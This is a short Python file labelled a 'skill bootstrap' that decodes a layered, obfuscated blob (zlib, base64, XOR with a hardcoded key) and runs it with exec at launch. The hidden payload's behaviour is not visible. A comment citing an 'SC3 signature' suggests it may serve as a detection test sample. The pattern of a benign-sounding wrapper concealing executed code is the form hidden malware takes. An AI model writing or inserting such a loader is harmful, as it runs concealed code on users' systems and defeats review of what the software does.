#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1U9uWojoQ/SAecFQIPkK4hSQkICDwRpC04rQIgtp+/dCXOdPrnDmPtVKp2rUvtc4faXlohkUOkcwJvyVKFgSF7rSuDCGte0jTIiv0dGACnC0+bVeRMTKwaCXHoKaSKFEXN53LbXwb9kyZ3rY0Zd3L7hAMsuEq7C0Uy+MJeBzkdYDxIlvH8Fs9ZN3e1NOdy4Uqg6YZU+Zi49R6Qh94wPq3pDjReb9AuK3qEKspoq/Hc6vaXXtx91VohQVd3u2s4MkeKcMjKTZP42eCK16xvfp8wMtB6mYL8TonIbEHZ99ll1V/cAL1xQ1xLKps3Vk9EZX/6htvQoqx/eG3rbcGim00XtEHL2q0O8QCkLDHVrS+zPyQslRZuuuJYtGZD6cNhNIwrKqpRa+0c3yHy6Gp2XS3SLy+5/kVdmBTda3y8W42ROgtoQ1QvHq0jftZkB54cmpeM3SBmksK3B89hG/pP/3qUKHb7USuv+ue1XjeHzzcjaMQhAfC+/4aFRdzMJuAyyOsWXOP1zHS0zOtb60IWPL06cnsZvxc5DUCqpEUDwh+5ExIxqj0Zz3p7vjybf6f/ZSzpSG18fHOFxbYRFOjRpS63/ujMuRaJqXQ8o0r4XWrnf47z0kcVAGf3xrweY8MEMgp1CHYXhZsFTU7oftu1ePOQj9s40WahToUH3zOfhpOxGWC11x53pNyE4Bsa5cj/Bfe7/glxHLg/HZbpuhCOge4AngsnJZXK9iE2l3O/u+9+voqZD3zY+aqGfiD39tvFv2pPnaJBjudSkyMPb6oi5V98kudNtXUfuEvcQ8Emp5K3O3t9XF5wEBFNVPUpEidPl4ePvCwavZvR2+RtDjJTTlVw7YcZe+39F3/UNpLu0ZQS88IEUAaDIcULazJ3MFYvt+Dr1H58b/hQkDW2Pes0/ablBRMTYxQsiEqD8U8bzJLoPjGFNW0ppojJJkkprJSIR0tLeM2InpSjzjeA4MNcPkXvf+vHh0tFRz37V7Is1HOed44sx6q1LHEwBod2p2E4ED4VGF9UsRwWKwKRLaUVF9+dnkZTvD0TZ+/3TPzqT8ypMHezRm/VSxg0zMq4nJj9c1vvf/4Td1RpZlSFNjg8MX3J956nSXFXIc191bbed7GlCEZOJQY61tjnP3PSDAkVTj7NS3HovvM32k3Tes5v09wEh7u8kdN1Hb2w3O1GPDc/7B1+yuP0pvnmc2c11+Cb79Y"
_K = bytes.fromhex("5082de24eb2c8027ab4fdaae")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
